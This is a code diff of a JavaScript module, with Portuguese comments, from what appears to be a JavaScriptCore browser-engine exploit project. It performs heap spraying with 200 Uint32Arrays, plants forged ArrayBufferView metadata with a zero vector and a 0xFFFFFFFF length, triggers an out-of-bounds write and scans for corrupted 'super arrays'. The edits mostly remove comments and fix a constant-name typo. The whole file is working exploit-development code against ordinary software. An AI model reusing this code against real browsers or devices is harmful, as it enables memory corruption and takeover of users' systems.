@@ -12,14 +12,14 @@ import {
 import { JSC_OFFSETS } from '../config.mjs';
 
 // ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
-const FNAME_DETECT_SPRAY_CORRUPTION = "detectSprayedArrayCorruption_v12a";
+const FNAME_DETECT_SPRAY_CORRUPTION = "detectSprayedArrayCorruption_v12a"; // Com 'R' maiúsculo
 
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50; // Onde plantamos os dados no oob_buffer
+const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50;
 
-const NUM_SPRAY_OBJECTS = 200; // Aumentar se necessário, ex: 500 ou 1000
+const NUM_SPRAY_OBJECTS = 200;
 const SPRAY_ELEMENT_VAL_A = 0xAAAAAAAA;
 const SPRAY_ELEMENT_VAL_B = 0xBBBBBBBB;
 const ORIGINAL_SPRAY_LENGTH = 8;
@@ -29,9 +29,9 @@ const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;
 
 // ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
 let sprayedVictimObjects = [];
-let originalSprayedValues = []; // Para comparar após a corrupção
+let originalSprayedValues = [];
 
-export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome da exportação
+export async function sprayAndInvestigateObjectExposure() {
     logS3(`--- Iniciando ${FNAME_DETECT_SPRAY_CORRUPTION}: Detectar Qualquer Corrupção em Arrays Pulverizados ---`, "test", FNAME_DETECT_SPRAY_CORRUPTION);
 
     try {
@@ -40,7 +40,8 @@ export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome d
             logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_DETECT_SPRAY_CORRUPTION);
             return;
         }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_DETECT_SPRAY_CORruption);
+        // CORREÇÃO AQUI: Usar FNAME_DETECT_SPRAY_CORRUPTION com 'R' maiúsculo
+        logS3("Ambiente OOB inicializado.", "info", FNAME_DETECT_SPRAY_CORRUPTION);
 
         // FASE 1: Pulverizar objetos Uint32Array e guardar seus valores originais
         logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${ORIGINAL_SPRAY_LENGTH}) e armazenando valores...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
@@ -51,15 +52,15 @@ export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome d
             u32arr[0] = SPRAY_ELEMENT_VAL_A;
             u32arr[1] = SPRAY_ELEMENT_VAL_B;
             for (let j = 2; j < ORIGINAL_SPRAY_LENGTH; j++) {
-                u32arr[j] = i; // Marcar com o índice do spray
+                u32arr[j] = i;
             }
             sprayedVictimObjects.push(u32arr);
-            originalSprayedValues.push(Array.from(u32arr)); // Guardar cópia dos valores
+            originalSprayedValues.push(Array.from(u32arr));
         }
         logS3("Pulverização e armazenamento de valores originais concluídos.", "good", FNAME_DETECT_SPRAY_CORRUPTION);
         await PAUSE_S3(50);
 
-        // FASE 2: Plantar valores no oob_array_buffer_real (como antes)
+        // FASE 2: Plantar valores no oob_array_buffer_real
         logS3(`FASE 2: Plantando futuros metadados (m_vector=0, m_length=0xFFFFFFFF) no oob_array_buffer_real...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
         const targetVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
         const targetLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
@@ -73,7 +74,7 @@ export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome d
         logS3(`FASE 3: Realizando escrita OOB em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         logS3("Escrita OOB de trigger realizada.", "good", FNAME_DETECT_SPRAY_CORRUPTION);
-        await PAUSE_S3(200); // Aumentar pausa para dar mais tempo para efeitos colaterais se manifestarem
+        await PAUSE_S3(200);
 
         // FASE 4: Verificar TODOS os arrays pulverizados por QUALQUER mudança
         logS3(`FASE 4: Verificando ${NUM_SPRAY_OBJECTS} arrays pulverizados por mudanças no length ou nos elementos...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
@@ -84,7 +85,6 @@ export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome d
             let isCorrupted = false;
             let corruptionDetails = "";
 
-            // Verificar mudança no length
             if (currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
                 isCorrupted = true;
                 corruptionDetails += ` Length alterado de ${ORIGINAL_SPRAY_LENGTH} para ${currentArray.length}.`;
@@ -92,32 +92,24 @@ export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome d
                     corruptionDetails += " (SUPER ARRAY LENGTH!)";
                 }
             }
-
-            // Verificar mudança nos elementos (mesmo que o length não tenha mudado, ou se mudou para algo acessível)
-            // Só verificar elementos se o length não for absurdamente grande para evitar loop infinito/crash
+            
             const maxElementsToCheck = (currentArray.length > 0 && currentArray.length < ORIGINAL_SPRAY_LENGTH * 2 && currentArray.length < 100) ? currentArray.length : ORIGINAL_SPRAY_LENGTH;
             
-            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) { // Iterar pelo tamanho original para comparação
+            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) {
                 let currentValue;
                 try {
-                    if (j < currentArray.length) { // Só ler se dentro do novo length
+                    if (j < currentArray.length) {
                         currentValue = currentArray[j];
                     } else if (isCorrupted && currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
-                        // Se o length foi corrompido e é menor, não podemos ler o índice original
-                        // Se o length é maior, o currentArray[j] acima teria lido (ou tentado)
-                        // Este caso é mais para quando o length é menor
                         corruptionDetails += ` Elemento original [${j}] inacessível (novo length: ${currentArray.length}).`;
-                        continue; // Não podemos comparar
+                        continue;
                     } else {
-                         // Length não mudou, mas j está fora do array? Impossível se j < ORIGINAL_SPRAY_LENGTH
-                         // Este caso é para segurança, mas não deve ser atingido se currentArray.length === ORIGINAL_SPRAY_LENGTH
                         continue;
                     }
-
                 } catch (e) {
                     isCorrupted = true;
                     corruptionDetails += ` Erro ao ler elemento [${j}]: ${e.message}.`;
-                    continue; // Pula para o próximo elemento ou array
+                    continue;
                 }
 
                 if (currentValue !== originalValues[j]) {
@@ -131,7 +123,6 @@ export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome d
                 logS3(`      Detalhes: ${corruptionDetails}`, "vuln", FNAME_DETECT_SPRAY_CORRUPTION);
                 corruptedArraysFound++;
                 document.title = `CORRUPÇÃO DETECTADA (${corruptedArraysFound})!`;
-                // Não parar no primeiro, continuar procurando por outros
             }
         }
 
